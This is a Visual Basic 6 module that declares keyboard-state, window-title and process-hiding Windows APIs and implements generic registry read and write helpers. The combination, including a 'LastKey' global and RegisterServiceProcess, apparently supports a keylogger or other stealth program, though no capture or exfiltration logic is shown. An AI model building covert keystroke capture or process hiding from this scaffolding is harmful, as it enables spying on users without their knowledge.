Attribute VB_Name = "Module3"
Global LastKey As String
Global timeout As Byte
Private Declare Function GetAsyncKeyState Lib "user32" (ByVal vKey As Long) As Integer
Private Declare Function GetKeyState Lib "user32" (ByVal nVirtKey As Long) As Integer
Private Declare Function EnumWindows Lib "user32" (ByVal lpEnumFunc As Long, ByVal lParam As Long) As Long
Private Declare Function GetWindowText Lib "user32" Alias "GetWindowTextA" (ByVal hwnd As Long, ByVal lpString As String, ByVal cch As Long) As Long
Public Declare Function GetCurrentProcessId Lib "kernel32" () As Long
Public Declare Function RegisterServiceProcess Lib "kernel32" (ByVal dwProcessID As Long, ByVal dwType As Long) As Long
    Public Const RSP_SIMPLE_SERVICE = 1
    Public Const RSP_UNREGISTER_SERVICE = 0

Public Type SECURITY_ATTRIBUTES
nLength As Long
lpSecurityDescriptor As Long
bInheritHandle As Long
End Type

Declare Function RegOpenKeyEx Lib "advapi32.dll" Alias "RegOpenKeyExA" _
(ByVal hKey As Long, ByVal lpSubKey As String, ByVal ulOptions As Long, _
ByVal samDesired As Long, phkResult As Long) As Long
Declare Function RegCloseKey Lib "advapi32.dll" (ByVal hKey As Long) As Long
Declare Function RegQueryValueEx Lib "advapi32" Alias "RegQueryValueExA" _
(ByVal hKey As Long, ByVal lpValueName As String, ByVal lpReserved As _
Long, ByRef lpType As Long, ByVal lpData As String, ByRef lpcbData As Long) As Long
Declare Function RegSetValueEx Lib "advapi32.dll" Alias "RegSetValueExA" (ByVal _
hKey As Long, ByVal lpValueName As String, ByVal Reserved As Long, ByVal _
dwType As Long, ByVal lpData As String, ByVal cbData As Long) As Long
Declare Function RegDeleteValue Lib "advapi32.dll" Alias "RegDeleteValueA" _
(ByVal hKey As Long, ByVal lpValueName As String) As Long
Declare Function RegCreateKeyEx Lib "advapi32.dll" Alias "RegCreateKeyExA" _
(ByVal hKey As Long, ByVal lpSubKey As String, ByVal Reserved As Long, _
ByVal lpClass As String, ByVal dwOptions As Long, ByVal samDesired As Long, _
lpSecurityAttributes As SECURITY_ATTRIBUTES, phkResult As Long, _
lpdwDisposition As Long) As Long
Declare Function RegDeleteKey Lib "advapi32.dll" Alias "RegDeleteKeyA" _
(ByVal hKey As Long, ByVal lpSubKey As String) As Long
Public Enum T_KeyClasses
HKEY_CLASSES_ROOT = &H80000000
HKEY_CURRENT_CONFIG = &H80000005
HKEY_CURRENT_USER = &H80000001
hkey_local_machine = &H80000002
HKEY_USERS = &H80000003
End Enum


Private Const SYNCHRONIZE = &H100000
Private Const STANDARD_RIGHTS_ALL = &H1F0000
Private Const KEY_QUERY_VALUE = &H1
Private Const KEY_SET_VALUE = &H2
Private Const KEY_CREATE_LINK = &H20
Private Const KEY_CREATE_SUB_KEY = &H4
Private Const KEY_ENUMERATE_SUB_KEYS = &H8
Private Const KEY_EVENT = &H1
Private Const KEY_NOTIFY = &H10
Private Const READ_CONTROL = &H20000
Private Const STANDARD_RIGHTS_READ = (READ_CONTROL)
Private Const STANDARD_RIGHTS_WRITE = (READ_CONTROL)
Private Const KEY_ALL_ACCESS = ((STANDARD_RIGHTS_ALL Or _
KEY_QUERY_VALUE Or KEY_SET_VALUE Or KEY_CREATE_SUB_KEY _
Or KEY_ENUMERATE_SUB_KEYS Or KEY_NOTIFY Or KEY_CREATE_LINK) _
And (Not SYNCHRONIZE))
Private Const KEY_READ = ((STANDARD_RIGHTS_READ Or _
KEY_QUERY_VALUE Or KEY_ENUMERATE_SUB_KEYS Or KEY_NOTIFY) _
And (Not SYNCHRONIZE))
Private Const KEY_EXECUTE = (KEY_READ)
Private Const KEY_WRITE = ((STANDARD_RIGHTS_WRITE Or _
KEY_SET_VALUE Or KEY_CREATE_SUB_KEY) And (Not SYNCHRONIZE))
Private Const REG_BINARY = 3
Private Const REG_CREATED_NEW_KEY = &H1
Private Const REG_DWORD = 4
Private Const REG_DWORD_BIG_ENDIAN = 5
Private Const REG_DWORD_LITTLE_ENDIAN = 4
Private Const REG_EXPAND_SZ = 2
Private Const REG_FULL_RESOURCE_DESCRIPTOR = 9
Private Const REG_LINK = 6
Private Const REG_MULTI_SZ = 7
Private Const REG_NONE = 0
Private Const REG_SZ = 1
Private Const REG_NOTIFY_CHANGE_ATTRIBUTES = &H2
Private Const REG_NOTIFY_CHANGE_LAST_SET = &H4
Private Const REG_NOTIFY_CHANGE_NAME = &H1
Private Const REG_NOTIFY_CHANGE_SECURITY = &H8
Private Const REG_OPTION_BACKUP_RESTORE = 4
Private Const REG_OPTION_CREATE_LINK = 2
Private Const REG_OPTION_NON_VOLATILE = 0
Private Const REG_OPTION_RESERVED = 0
Private Const REG_OPTION_VOLATILE = 1
Private Const REG_LEGAL_CHANGE_FILTER = (REG_NOTIFY_CHANGE_NAME _
Or REG_NOTIFY_CHANGE_ATTRIBUTES Or _
REG_NOTIFY_CHANGE_LAST_SET Or _
REG_NOTIFY_CHANGE_SECURITY)
Private Const REG_LEGAL_OPTION = (REG_OPTION_RESERVED Or _
REG_OPTION_NON_VOLATILE Or REG_OPTION_VOLATILE Or _
REG_OPTION_CREATE_LINK Or REG_OPTION_BACKUP_RESTORE)

Public Function GetRegValue(KeyRoot As T_KeyClasses, Path As String, _
sKey As String) As String
Dim hKey As Long
Dim KeyValType As Long
Dim KeyValSize As Long
Dim KeyVal As String
Dim tmpVal As String
Dim res As Long
Dim i As Integer
res = RegOpenKeyEx(KeyRoot, Path, 0, KEY_ALL_ACCESS, hKey)
If res <> 0 Then GoTo Errore
tmpVal = String(1024, 0)
KeyValSize = 1024
res = RegQueryValueEx(hKey, sKey, 0, KeyValType, tmpVal, KeyValSize)
If res <> 0 Then GoTo Errore
If (Asc(Mid(tmpVal, KeyValSize, 1)) = 0) Then
tmpVal = Left(tmpVal, KeyValSize - 1)
Else
tmpVal = Left(tmpVal, KeyValSize)
End If
Select Case KeyValType
Case REG_SZ
KeyVal = tmpVal
Case REG_DWORD
For i = Len(tmpVal) To 1 Step -1
KeyVal = KeyVal + Hex(Asc(Mid(tmpVal, i, 1)))
Next
KeyVal = Format("&h" + KeyVal)
End Select
GetRegValue = KeyVal
RegCloseKey hKey
Exit Function
Errore:
GetRegValue = ""
RegCloseKey hKey
End Function

Public Function SetRegValue(KeyRoot As T_KeyClasses, Path As String, sKey As _
String, NewValue As String) As Boolean
Dim hKey As Long
Dim KeyValType As Long
Dim KeyValSize As Long
Dim KeyVal As String
Dim tmpVal As String
Dim res As Long
Dim i As Integer
Dim X As Long
res = RegOpenKeyEx(KeyRoot, Path, 0, KEY_ALL_ACCESS, hKey)
If res <> 0 Then GoTo Errore
tmpVal = String(1024, 0)
KeyValSize = 1024
res = RegQueryValueEx(hKey, sKey, 0, KeyValType, tmpVal, KeyValSize)
Select Case res
Case 2
KeyValType = REG_SZ
Case Is <> 0
GoTo Errore
End Select
Select Case KeyValType
Case REG_SZ
tmpVal = NewValue
Case REG_DWORD
X = Val(NewValue)
tmpVal = ""
For i = 0 To 3
tmpVal = tmpVal & Chr(X Mod 256)
X = X \ 256
Next
End Select
KeyValSize = Len(tmpVal)
res = RegSetValueEx(hKey, sKey, 0, KeyValType, tmpVal, KeyValSize)
If res <> 0 Then GoTo Errore
SetRegValue = True
RegCloseKey hKey
Exit Function
Errore:
SetRegValue = False
RegCloseKey hKey
End Function

